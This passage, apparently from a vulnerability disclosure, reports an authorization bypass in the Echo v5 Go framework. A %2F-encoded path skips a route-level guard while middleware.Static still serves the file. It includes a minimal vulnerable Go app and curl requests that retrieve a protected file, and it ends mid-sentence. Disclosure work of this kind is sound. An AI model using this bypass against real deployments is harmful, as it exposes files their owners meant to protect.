- **CVE-2026-25766 / GHSA-pgvm-wxw2-hrv9** (patched 5.0.3): a *different* issue (Windows backslash traversal **outside** the root). Referenced only to disambiguate; not the same as this report.

## PoC

Environment: `golang:1.25`, module using the official release (`go get github.com/labstack/echo/v5@v5.3.1`, no local `replace`). Static root `public/` contains a marker file `public/admin/secret.txt` = `SECRET`.

Minimal app (the pattern under test: static served globally + a group guard intended to protect `/admin`):

```go
package main

import (
	"net/http"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
)

func main() {
	e := echo.New()
	e.Use(middleware.Static("public")) // serves ./public globally (default filesystem)

	admin := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
		return func(c *echo.Context) error { return c.String(http.StatusUnauthorized, "auth required") }
	})
	admin.GET("/secret.txt", func(c *echo.Context) error { return c.String(http.StatusOK, "handler") })

	e.Start(":1323")
}
```

Requests (unauthenticated):

```
# Literal: route matches -> group guard runs
curl -i http://localhost:1323/admin/secret.txt
# => 401

# %2F-encoded: route does NOT match -> guard skipped, but middleware.Static serves the file
curl -i --path-as-is http://localhost:1323/admin%2Fsecret.txt
# => 200, body: SECRET
```

Observed on `v5.3.1`: literal → `401`; `%2F` → `200` with the file contents. For contrast, serving via the (patched) `e.StaticFS("/")` returns `404` for the same `%2F` request, showing the `middleware.Static` path was not covered by the CVE-2026-55677 fix.

## Impact

An unauthenticated remote user can retrieve a file served by `middleware.Static` even when the application attached a route/group middleware guard to that path, by substituting `/` with `%2F`. The consequence is limited to files already inside the served static root (CWE-863 authorization inconsistency; CWE-436 interpretation conflict) — **there is no access to files outside the static root**.

**Honest caveat on validity / severity:** this only has security impact for applications that (a) serve a directory statically to the public *and* (b) place a sensitive file inside that same directory while relying on a *route-level* guard to protect it. That combination is arguably a misconfiguration — a statically-served directory is public by design — so maintainers may reasonably classify this as a documentation fix (correct the `EnablePathUnescaping` claim) or won't-fix rather than a code vulnerability. It is filed primarily because (1) the router-vs-handler `%2F` inconsistency is the exact class fixed in CVE-2026-55677 but left uncovered for `middleware.Static`, and (2) the doc
